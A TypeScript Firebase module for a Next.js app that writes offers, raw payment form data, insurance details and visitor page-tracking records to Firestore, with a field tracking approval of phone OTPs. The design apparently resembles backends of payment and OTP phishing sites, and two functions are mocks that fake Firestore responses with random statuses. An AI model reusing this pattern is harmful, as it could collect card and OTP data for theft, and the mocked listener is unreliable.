import { getApp, getApps, initializeApp } from "firebase/app";
import {
  Firestore,
  addDoc,
  collection,
  doc,
  getFirestore,
  setDoc,
  updateDoc,
} from "firebase/firestore";
import { Offer } from "./types/offers";
import { PaymentFormData } from "./types/payemnts";
import { InsuranceFormData } from "./types/insurance";

const firebaseConfig = {
  apiKey: "AIzaSyAQFKUhBkyCY6xYwtDOU92jHPVHCWxjdkE",
  authDomain: "ommns-7d92f.firebaseapp.com",
  databaseURL: "https://ommns-7d92f-default-rtdb.firebaseio.com",
  projectId: "ommns-7d92f",
  storageBucket: "ommns-7d92f.firebasestorage.app",
  messagingSenderId: "86163804101",
  appId: "1:86163804101:web:4dce616ff898481d9245ac",
  measurementId: "G-46K3XSZY10",
};

// Initialize Firebase - safely for Next.js (client-side only)
let app;
let db: Firestore;

if (typeof window !== "undefined") {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
}
export async function updateStaute(_paymentStatus: string, id: string) {
  const docRef = doc(db, "pays", id);
  await updateDoc(docRef, {
    paymentStatus: _paymentStatus,
  });
}
/**
 * Add an offer to Firestore
 */
export async function addOffer(offer: Offer) {
  if (typeof window === "undefined") return null;

  try {
    // If we have an ID, use it, otherwise let Firestore generate one
    if (offer.id) {
      const offerRef = doc(db, "offers", offer.id);
      await setDoc(offerRef, {
        ...offer,
        createdAt: new Date().toISOString(),
      });
      console.log("Offer added with ID:", offer.id);
      return offer.id;
    } else {
      const offerRef = await addDoc(collection(db, "offers"), {
        ...offer,
        createdAt: new Date().toISOString(),
      });
      console.log("Offer added with ID:", offerRef.id);
      return offerRef.id;
    }
  } catch (error) {
    console.error("Error adding offer:", error);
    throw error;
  }
}

/**
 * Add payment information to Firestore
 */
export async function addPaymentInfo(
  paymentData: PaymentFormData,
  userId: string
) {
  if (typeof window === "undefined") return null;

  try {
    // Store payment info with the user ID as reference
    const paymentRef = await addDoc(collection(db, "payments"), {
      ...paymentData,
      userId,
      createdAt: new Date().toISOString(),
    });

    console.log("Payment info added with ID:", paymentRef.id);
    return paymentRef.id;
  } catch (error) {
    console.error("Error adding payment info:", error);
    throw error;
  }
}

export async function addData(data: any) {
  if (typeof window === "undefined") return null;

  localStorage.setItem("visitor", data.id);
  try {
    const docRef = doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      { createdDate: new Date().toISOString(), ...data },
      { merge: true }
    );

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}

/**
 * Add insurance form data to Firestore
 */
export const handleUpdatePage = async (
  newPagename: string,
  arPageName: string,
  id: string
) => {
  if (typeof window === "undefined") return null;

  const targetPost = doc(db, "pays", id);
  await updateDoc(targetPost, {
    pagename: newPagename,
    arabicPageName: arPageName,
  });
};

export async function addInsuranceData(
  insuranceData: InsuranceFormData,
  userId: string
) {
  if (typeof window === "undefined") return null;

  try {
    // Store insurance data with the user ID as reference
    const insuranceRef = await addDoc(collection(db, "insurances"), {
      ...insuranceData,
      userId,
      createdDate: new Date().toISOString(),
      status: "pending", // You can add a status field to track the insurance request
    });

    console.log("Insurance data added with ID:", insuranceRef.id);
    return insuranceRef.id;
  } catch (error) {
    console.error("Error adding insurance data:", error);
    throw error;
  }
}

// Mock Firebase API for listenToDocument
type DocumentListener = (data: any | null) => void;

export const listenToDocument = (
  id: string,
  callback: DocumentListener
): (() => void) => {
  if (typeof window === "undefined") return () => {};

  console.log("Setting up real-time listener for document:", id);

  // Simulate onSnapshot behavior
  let active = true;

  // Initial callback with no data
  setTimeout(() => {
    if (active) callback(null);
  }, 500);

  // Simulate data changes
  const interval = setInterval(() => {
    if (!active) return;

    // Randomly decide if we should send an update
    const shouldUpdate = Math.random() > 0.7;

    if (shouldUpdate) {
      // Randomly choose between approved, rejected, or no status yet
      const statuses = ["approved", "rejected", null, null, null];
      const randomStatus =
        statuses[Math.floor(Math.random() * statuses.length)];

      if (randomStatus) {
        callback({
          id,
          otpPhoneStatus: randomStatus,
          createdDate: new Date().toISOString(),
        });
      } else {
        callback({ id });
      }
    }
  }, 2000); // Check every 2 seconds

  // Return unsubscribe function
  return () => {
    active = false;
    clearInterval(interval);
    console.log("Unsubscribed from document listener:", id);
  };
};

// Get document by ID from Firestore (kept for backward compatibility)
export const getDocumentById = async (id: string): Promise<any | null> => {
  if (typeof window === "undefined") return null;

  console.log("Getting document from Firestore with ID:", id);

  // Simulate API call
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({
        id,
        createdDate: new Date().toISOString(),
      });
    }, 500);
  });
};

export { db };
